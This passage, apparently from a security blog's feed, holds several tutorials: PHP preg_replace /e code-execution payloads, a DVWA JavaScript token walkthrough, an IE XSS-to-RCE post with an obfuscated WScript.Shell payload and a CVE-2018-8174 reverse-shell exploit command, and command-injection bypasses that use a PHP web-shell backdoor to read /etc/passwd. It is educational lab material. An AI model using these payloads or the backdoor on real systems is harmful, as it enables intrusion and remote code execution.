src="/2019/07/02/浅析preg-replace与preg-match/9.png" alt=""></p><p>没关系，换以下几个payload的形式来Bypass即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">re=[php]var_dump(`dir`)[/php]</span><br><span class="line">re=[php]$&#123;eval($_GET[_])&#125;[/php]&amp;_=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2019/07/02/浅析preg-replace与preg-match/10.png" alt=""></p><h3 id="反向引用"><a href="#反向引用" class="headerlink" title="反向引用"></a>反向引用</h3><p>这里解释下前面Demo中replacement参数的”\\1”指的是什么意思。</p><blockquote><p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p></blockquote><p>\\1中第一个反斜线是转义符号的作用所以它实际上是\1，作用就是引用临时缓存区中编号为1的储存内容，也就是第一次被捕获的子匹配。</p><p>所以，之前Demo中replacement参数的”\\1”的意思就是将通过pattern参数匹配到的内容捕获到并赋值给replacement参数。</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>看一道PHP代码审计题目吧：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/plain"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complexStrtolower</span><span class="params">($regex, $value)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> preg_replace(</span><br><span class="line"><span class="string">'/('</span> . $regex . <span class="string">')/ei'</span>,</span><br><span class="line"><span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">$value</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $regex =&gt; $value) &#123;</span><br><span class="line"><span class="keyword">echo</span> complexStrtolower($regex, $value) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码比较简单，将GET方式传递进来的参数名和参数值分别作为preg_replace()函数的pattern参数的正则部分和subject参数，也就是说preg_replace()函数的第一个参数和第三个参数可控，其中pattern参数含有/e修正符，可以实现PHP代码执行。</p><p>下面看下几个坑。</p><p><strong>坑1——可变变量</strong></p><p>比较下下面两个代码的区别：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不会执行phpinfo()</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">'/(.*)/ei'</span>, <span class="string">'strtolower("\\1")'</span>, <span class="string">'phpinfo()'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//会执行phpinfo()</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">'/(.*)/ei'</span>, <span class="string">'strtolower("\\1")'</span>, <span class="string">'$&#123;phpinfo()&#125;'</span>);</span><br><span class="line"><span class="comment">//&#123;$&#123;phpinfo()&#125;&#125;与$&#123;phpinfo()&#125;一致</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在前面的模式三Demo中，subject参数为’phpinfo()’即可执行，但这里却不行，因为这里的replacement参数为’strtolower(“\\1”)’，即多调用了strtolower()函数、将\1捕获到的内容转换为了字符串的形式而非代码形式，从而导致无法正常执行。</p><p>这里用到可变变量的概念来Bypass。在PHP中变量名是可以动态设置的，看个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"hello"</span>;</span><br><span class="line">$$a = <span class="string">"world"</span>;</span><br><span class="line"><span class="keyword">echo</span> $$a;</span><br><span class="line"><span class="keyword">echo</span> $hello;</span><br><span class="line"><span class="comment">//这两个的输出是一样的，输出的都是world，即$$a是先获取$a的值作为变量名，所以$$a=$hello=world</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是这样就存在一个歧义的问题，比如说\$\$a[1]，解析器需要知道是想要\$a[1]作为一个变量呢，还是想要$$a作为一个变量并取出该变量中索引为 [1]的值。解决此问题的语法是，对第一种情况用\${\$a[1]}，对第二种情况用​\${\$a}[1]。</p><p>在这个坑中怎么Bypass呢？——将phpinfo()整个看做一个变量名，外面加上\${}括起来；另一个重要的条件是preg_replace()的replacement参数中是用双引号括起来的即”\\1”，因为双引号会解析里面的变量，因此会先解析\${phpinfo()}里面的内容会变量名，从而执行了phpinfo()。</p><p><strong>坑2——GET传递特殊字符会被转换掉</strong></p><p>官方给出的payload为：<code>/?.*={${phpinfo()}}</code></p><p>即GET参数名为.*，参数值为{${phpinfo()}}。</p><p>直接写进去访问确实没问题，因为(.*)是贪婪模式，会一直匹配符合的内容：</p><p><img src="/2019/07/02/浅析preg-replace与preg-match/4.png" alt=""></p><p>但是一到远程GET传参就GG了：</p><p><img src="/2019/07/02/浅析preg-replace与preg-match/5.png" alt=""></p><p>var_dump看下GET传入的参数是啥：</p><p><img src="/2019/07/02/浅析preg-replace与preg-match/6.png" alt=""></p><p>好吧，’.’被转换成了’_‘，这是因为在PHP中，对于传入的非法的\$_GET数组参数名，会将其转换成下划线，这就导致我们正则匹配失效。我们可以fuzz一下PHP会将哪些符号替换成下划线，这里借用大佬博客的图：</p><p><img src="/2019/07/02/浅析preg-replace与preg-match/7.png" alt=""></p><p><strong>Exp</strong></p><p>既然(.*)这种贪婪模式无法正常传递过去，那就换其他的payload就OK了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\S*=$&#123;phpinfo()&#125;</span><br><span class="line">\$&#123;\w*\(\)&#125;=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/07/02/浅析preg-replace与preg-match/8.png" alt=""></p><h2 id="0x02-preg-match"><a href="#0x02-preg-match" class="headerlink" title="0x02 preg_match()"></a>0x02 preg_match()</h2><h3 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h3><p>preg_match — 执行匹配正则表达式</p><p>函数定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match ( string pattern , string matches [, int flags = 0 [, int $offset = 0 ]]] ) : int</span><br></pre></td></tr></table></figure><p>搜索subject与pattern给定的正则表达式的一个匹配。</p><p>preg_match()并不会执行PHP代码，但是它在一些CTF题目这种出现过，看道题目吧。</p><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>可参考：<a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#preg_match" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#preg_match</a></p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://doubler.cn/2018/10/02/PHP-Audit-Labs-Day8/" target="_blank" rel="noopener">PHP代码审计-preg_replace函数命令执行</a></p><p><a href="https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">深入研究preg_replace与代码执行</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>DVWA之JavaScript攻击</title>
    <link href="https://Mi1k7ea.github.com/2019/07/02/DVWA%E4%B9%8BJavaScript%E6%94%BB%E5%87%BB/"/>
    <id>https://Mi1k7ea.github.com/2019/07/02/DVWA之JavaScript攻击/</id>
    <published>2019-07-02T12:21:28.000Z</published>
    <updated>2019-07-02T13:46:37.284Z</updated>
    
    <content type="html"><![CDATA[<p>JavaScript攻击属于Web前端安全，不存在黑盒测试的概念，直接可以对JS进行白盒代码审计。</p><p>DVWA中的JavaScript攻击的场景是基于token由前端JS生成而引起的一系列问题。</p><h2 id="0x01-Low-Level"><a href="#0x01-Low-Level" class="headerlink" title="0x01 Low Level"></a>0x01 Low Level</h2><p>页面如下，要求输入success来达到目的：</p><p><img src="/2019/07/02/DVWA之JavaScript攻击/1.png" alt=""></p><p>直接输入success提交，会显示invalid token：</p><p><img src="/2019/07/02/DVWA之JavaScript攻击/2.png" alt=""></p><p>查看页面源代码，看到是调用generate_token()函数，其中的token值是由md5(rot13(phrase))得到的，并且表单中存在一项隐藏的表项token：</p><p><img src="/2019/07/02/DVWA之JavaScript攻击/3.png" alt=""></p><p>可以看到，token是通过JS在客户端生成。而题目的意思应该就是让token的值和phrase经过某些加密操作后的值相等即可。</p><p>那就简单了，先在Console直接得到正确的token值：</p><p><img src="/2019/07/02/DVWA之JavaScript攻击/4.png" alt=""></p><p>在前端直接篡改token的值即可：</p><p><img src="/2019/07/02/DVWA之JavaScript攻击/5.png" alt=""></p><p>再输入success，OK：</p><p><img src="/2019/07/02/DVWA之JavaScript攻击/6.png" alt=""></p><p>最后，我们看下index.php源码，确认确实是通过比较加密phrase后的值与token的值是否相等来看是否JS攻击成功：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($phrase == <span class="string">"success"</span>) &#123;</span><br><span class="line"><span class="keyword">switch</span>( $_COOKIE[ <span class="string">'security'</span> ] ) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'low'</span>:</span><br><span class="line"><span class="keyword">if</span> ($token == md5(str_rot13(<span class="string">"success"</span>))) &#123;</span><br><span class="line">$message = <span class="string">"&lt;p style='color:red'&gt;Well done!&lt;/p&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$message = <span class="string">"&lt;p&gt;Invalid token.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'medium'</span>:</span><br><span class="line"><span class="keyword">if</span> ($token == strrev(<span class="string">"XXsuccessXX"</span>)) &#123;</span><br><span class="line">$message = <span class="string">"&lt;p style='color:red'&gt;Well done!&lt;/p&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$message = <span class="string">"&lt;p&gt;Invalid token.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'high'</span>:</span><br><span class="line"><span class="keyword">if</span> ($token == hash(<span class="string">"sha256"</span>, hash(<span class="string">"sha256"</span>, <span class="string">"XX"</span> . strrev(<span class="string">"success"</span>)) . <span class="string">"ZZ"</span>)) &#123;</span><br><span class="line">$message = <span class="string">"&lt;p style='color:red'&gt;Well done!&lt;/p&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$message = <span class="string">"&lt;p&gt;Invalid token.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">$vulnerabilityFile = <span class="string">'impossible.php'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$message = <span class="string">"&lt;p&gt;You got the phrase wrong.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-Medium-Level"><a href="#0x02-Medium-Level" class="headerlink" title="0x02 Medium Level"></a>0x02 Medium Level</h2><p>和前面类似，只是换了JS代码，在表单处单独调用JS文件：</p><p><img src="/2019/07/02/DVWA之JavaScript攻击/7.png" alt=""></p><p>访问该JS文件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_something</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="string">""</span>,n=e.length<span class="number">-1</span>;n&gt;=<span class="number">0</span>;n--)t+=e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;do_elsesomething(<span class="string">"XX"</span>)&#125;,<span class="number">300</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_elsesomething</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"token"</span>).value=do_something(e+<span class="built_in">document</span>.getElementById(<span class="string">"phrase"</span>).value+<span class="string">"XX"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码逻辑在调用setTimeout()，setTimeout()方法用于在指定的毫秒数后调用函数或计算表达式。这里调用do_elsesomething()函数，而do_elsesomething()函数中有生成token的代码，其中将传入参数e、前端表单输入的phrase值以及”XX”字符串进行拼接再调用do_something()函数进行字符串翻转处理。</p><p>那就这样吧：</p><p><img src="/2019/07/02/DVWA之JavaScript攻击/8.png" alt=""></p><p>改下JS即可：</p><p><img src="/2019/07/02/DVWA之JavaScript攻击/9.png" alt=""></p><h2 id="0x03-High-Level"><a href="#0x03-High-Level" class="headerlink" title="0x03 High Level"></a>0x03 High Level</h2><p>再看下high的，调用了high.js：</p><p><img src="/2019/07/02/DVWA之JavaScript攻击/10.png" alt=""></p><p>查看high.js，发现不是人看的代码：</p><p><img src="/2019/07/02/DVWA之JavaScript攻击/11.png" alt=""></p><p>这是因为做了混淆，访问<a href="http://deobfuscatejavascript.com/" target="_blank" rel="noopener">解码网站</a>来转换成人民群众可看懂的形式，下面只列出关键的代码，前面省略的部分是算法部分：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_something</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">""</span>, n = e.length - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--) t += e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_3</span>(<span class="params">t, y = <span class="string">"ZZ"</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"token"</span>).value = sha256(<span class="built_in">document</span>.getElementById(<span class="string">"token"</span>).value + y)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_2</span>(<span class="params">e = <span class="string">"YY"</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"token"</span>).value = sha256(e + <span class="built_in">document</span>.getElementById(<span class="string">"token"</span>).value)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_1</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"token"</span>).value = do_something(<span class="built_in">document</span>.getElementById(<span class="string">"phrase"</span>).value)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"phrase"</span>).value = <span class="string">""</span>;</span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    token_part_2(<span class="string">"XX"</span>)</span><br><span class="line">&#125;, <span class="number">300</span>);</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"send"</span>).addEventListener(<span class="string">"click"</span>, token_part_3);</span><br><span class="line">token_part_1(<span class="string">"ABCD"</span>, <span class="number">44</span>);</span><br></pre></td></tr></table></figure><p>几个函数调用顺序及生成token的步骤如下：</p><p>1、执行token_part_1()，取phrase值并进行字符串翻转处理；</p><p>2、延迟300ms后执行token_part_2()，传入参数字符串’XX’和token值拼接并调用sha256()加密；</p><p>3、点击按钮时执行token_part_3()，将token值和字符串’ZZ’拼接并调用sha256()加密，从而得到最终的token；</p><p>一波操作如下，先将转换过来的JS前一部分关于sha256算法定义代码输入实现初始化，方便后面直接调用sha256()：</p><p><img src="/2019/07/02/DVWA之JavaScript攻击/12.png" alt=""></p><p>然后按照前面的分析得到token值：</p><p><img src="/2019/07/02/DVWA之JavaScript攻击/13.png" alt=""></p><p>最后修改token的值为ec7ef8687050b6fe803867ea696734c67b541dfafb286a0b1239f42ac5b0aa84即可。</p><h2 id="0x04-Impossible-Level"><a href="#0x04-Impossible-Level" class="headerlink" title="0x04 Impossible Level"></a>0x04 Impossible Level</h2><p>页面显示一句话：</p><blockquote><p>You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.</p></blockquote><p>永远不要相信用户输入的内容，哈哈哈。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="WriteUp:Web" scheme="https://Mi1k7ea.github.com/categories/WriteUp-Web/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="JavaScript" scheme="https://Mi1k7ea.github.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>XSS从弹框到RCE（IE）</title>
    <link href="https://Mi1k7ea.github.com/2019/06/30/XSS%E4%BB%8E%E5%BC%B9%E6%A1%86%E5%88%B0RCE/"/>
    <id>https://Mi1k7ea.github.com/2019/06/30/XSS从弹框到RCE/</id>
    <published>2019-06-30T04:29:06.000Z</published>
    <updated>2019-06-30T10:34:18.925Z</updated>
    
    <content type="html"><![CDATA[<p>为了提高XSS漏洞的严重性，这里利用JS在IE上实现RCE。</p><h2 id="0x01-利用ActiveXObject"><a href="#0x01-利用ActiveXObject" class="headerlink" title="0x01 利用ActiveXObject"></a>0x01 利用ActiveXObject</h2><p>这里以DVWA的反射型XSS为示例，其他情形的XSS利用同理。</p><p>构造的JavaScript代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</span><br><span class="line">o.run(<span class="string">"calc.exe"</span>);</span><br></pre></td></tr></table></figure><p>放到payload中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> o = <span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);o.run(<span class="string">"calc.exe"</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>输入后无任何反应，但在控制台可看到报错：</p><p><img src="/2019/06/30/XSS从弹框到RCE/1.png" alt=""></p><p>这种利用方式id前提是需要在IE上打开Internet Explorer “工具”菜单栏中的“选项”-“安全”-“自定义级别”-“对没有标记为安全的activex控件进行初始化和脚本运行-设置成启用，如下：</p><p><img src="/2019/06/30/XSS从弹框到RCE/2.png" alt=""></p><p>修改设置后，再次提交payload，系统会弹框警告：</p><p><img src="/2019/06/30/XSS从弹框到RCE/3.png" alt=""></p><p>只要用户点击确定即可执行exp：</p><p><img src="/2019/06/30/XSS从弹框到RCE/4.png" alt=""></p><p>当然，为了掩饰，我们可以对代码进行加密，加密后代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode(10,118,97,114,32,111,61,110,101,119,32,65,99,116,105,118,101,88,79,98,106,101,99,116,40,39,87,83,99,114,105,112,116,46,115,104,101,108,108,39,41,59,10,111,46,114,117,110,40,39,99,97,108,99,46,101,120,101,39,41,59,10)</span><br></pre></td></tr></table></figure><p>最终Exp如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">10</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">111</span>,<span class="number">61</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">119</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">118</span>,<span class="number">101</span>,<span class="number">88</span>,<span class="number">79</span>,<span class="number">98</span>,<span class="number">106</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">87</span>,<span class="number">83</span>,<span class="number">99</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">111</span>,<span class="number">46</span>,<span class="number">114</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>,<span class="number">46</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">101</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/06/30/XSS从弹框到RCE/5.png" alt=""></p><h2 id="0x02-结合CVE-2018-8174利用"><a href="#0x02-结合CVE-2018-8174利用" class="headerlink" title="0x02 结合CVE-2018-8174利用"></a>0x02 结合CVE-2018-8174利用</h2><p>这里我们可以引入浏览器漏洞，以CVE-2018-8174漏洞为例。</p><p>Exp下载地址：<a href="https://github.com/Yt1g3r/CVE-2018-8174_EXP" target="_blank" rel="noopener">https://github.com/Yt1g3r/CVE-2018-8174_EXP</a></p><p><strong>第一步——生成恶意exploit.hml文件</strong></p><p>在命令行输入以下命令，得到exploit.html：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-<span class="number">2018</span>-<span class="number">8174</span>.py -u http://<span class="number">192.168</span>.<span class="number">17.148</span>:<span class="number">81</span> -i <span class="number">192.168</span>.<span class="number">17.160</span> -p <span class="number">6666</span> -o exp.ctf</span><br></pre></td></tr></table></figure><p><img src="/2019/06/30/XSS从弹框到RCE/6.png" alt=""></p><p><strong>第二步——开启nc监听端口，并将exploit.html文件上传到服务器</strong></p><p>其实exploit.html是一个通过script标签调用VBScript代码的页面，这种场景使用于存在XSS的页面，只需要将exploit.html中的script标签的内容作为输入即可进行XSS利用，这里只演示原理。</p><p><strong>第三步——受害者访问exploit.html实现反弹shell</strong></p><p>受害者访问exploit.html会显示报错：</p><p><img src="/2019/06/30/XSS从弹框到RCE/7.png" alt=""></p><p>监听端接受到反弹shell：</p><p><img src="/2019/06/30/XSS从弹框到RCE/8.png" alt=""></p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://xz.aliyun.com/t/3919" target="_blank" rel="noopener">记一次从DOM型XSS到RCE过程</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://Mi1k7ea.github.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://Mi1k7ea.github.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>命令注入Bypass技巧小结</title>
    <link href="https://Mi1k7ea.github.com/2019/06/30/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5Bypass%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/"/>
    <id>https://Mi1k7ea.github.com/2019/06/30/命令注入Bypass技巧小结/</id>
    <published>2019-06-30T03:35:18.000Z</published>
    <updated>2019-07-23T13:52:37.551Z</updated>
    
    <content type="html"><![CDATA[<p>这里小结下各位师傅的Bypass技巧。</p><p>测试后门代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">'m'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x01-空格过滤Bypass"><a href="#0x01-空格过滤Bypass" class="headerlink" title="0x01 空格过滤Bypass"></a>0x01 空格过滤Bypass</h2><h3 id="使用-IFS"><a href="#使用-IFS" class="headerlink" title="使用$IFS"></a>使用$IFS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://m.com/shell.php?m=ls$IFS/tmp</span><br></pre></td></tr></table></figure><p>一些特殊情况可用以下变体：</p><p>\$IFS​\$9——后面加个\$与{}类似，起截断作用，\$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat\$IFS2\$9flag.php；</p><p>\${IFS}——单纯cat​\$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名，如cat\${IFS2}flag.php；</p><h3 id="使用-cmd-p1-p2……"><a href="#使用-cmd-p1-p2……" class="headerlink" title="使用{cmd,p1[,p2……]}"></a>使用{cmd,p1[,p2……]}</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://m.com/shell.php?m=&#123;cat,/etc/passwd&#125;</span><br></pre></td></tr></table></figure><h3 id="使用Tab"><a href="#使用Tab" class="headerlink" title="使用Tab"></a>使用Tab</h3><p>在PHP环境下使用%09可以替换空格，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://m.com/shell.php?m=cat%09/etc/passwd</span><br></pre></td></tr></table></figure><h3 id="使用重定向"><a href="#使用重定向" class="headerlink" title="使用重定向"></a>使用重定向</h3><p>&lt;重定向，如：cat&lt;flag.php</p><p>&lt;&gt;重定向，如：ls&lt;&gt;a.txt</p><h2 id="0x02-关键字过滤Bypass"><a href="#0x02-关键字过滤Bypass" class="headerlink" title="0x02 关键字过滤Bypass"></a>0x02 关键字过滤Bypass</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 